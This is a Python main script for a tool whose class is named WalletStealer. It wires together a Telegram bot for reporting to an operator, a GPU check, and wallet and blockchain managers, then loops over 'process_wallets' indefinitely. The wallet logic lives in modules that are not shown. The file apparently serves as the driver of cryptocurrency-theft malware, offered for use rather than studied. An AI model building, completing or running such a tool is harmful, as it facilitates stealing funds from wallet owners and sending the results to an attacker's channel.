#!/usr/bin/env python3
import os
import asyncio
from dotenv import load_dotenv
from pathlib import Path
from typing import Optional, Dict

from src.config import Config
from src.core.wallet_manager import WalletManager
from src.core.blockchain_manager import BlockchainManager
from src.services.telegram_service import TelegramService
from src.utils.logger import setup_logger
from src.utils.gpu_utils import check_gpu_availability

class WalletStealer:
    def __init__(self):
        self.logger = setup_logger()
        self.config = Config()
        self.telegram: Optional[TelegramService] = None
        self.wallet_manager: Optional[WalletManager] = None
        self.blockchain_manager: Optional[BlockchainManager] = None

    async def initialize(self) -> bool:
        """Initialize all components and check requirements"""
        try:
            # Check GPU availability
            if not check_gpu_availability():
                self.logger.warning("GPU not available. Falling back to CPU.")

            # Load environment variables
            self._load_environment()

            # Initialize components
            self.telegram = TelegramService(
                token=self.config.telegram_token,
                chat_id=self.config.telegram_chat_id
            )
            
            self.blockchain_manager = BlockchainManager()
            self.wallet_manager = WalletManager(self.blockchain_manager)

            await self.telegram.send_message("System initialized successfully!")
            return True

        except Exception as e:
            self.logger.error(f"Initialization failed: {str(e)}")
            return False

    def _load_environment(self) -> None:
        """Load environment variables from .env file"""
        env_path = Path('.env')
        if not env_path.exists():
            # Create .env file if it doesn't exist
            with open(env_path, 'w') as f:
                f.write("TELEGRAM_BOT_TOKEN=\nTELEGRAM_CHAT_ID=\n")
        
        load_dotenv()
        
        # Check for required environment variables
        required_vars = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID']
        missing_vars = [var for var in required_vars if not os.getenv(var)]
        
        if missing_vars:
            raise ValueError(f"Missing required environment variables: {', '.join(missing_vars)}")

    async def run(self) -> None:
        """Main execution loop"""
        if not await self.initialize():
            self.logger.error("Failed to initialize. Exiting...")
            return

        try:
            while True:
                await self.wallet_manager.process_wallets()
                await asyncio.sleep(self.config.check_interval)

        except KeyboardInterrupt:
            self.logger.info("Shutting down gracefully...")
        except Exception as e:
            self.logger.error(f"Error in main loop: {str(e)}")
            await self.telegram.send_message(f"Error occurred: {str(e)}")

async def main():
    wallet_stealer = WalletStealer()
    await wallet_stealer.run()

if __name__ == "__main__":
    asyncio.run(main())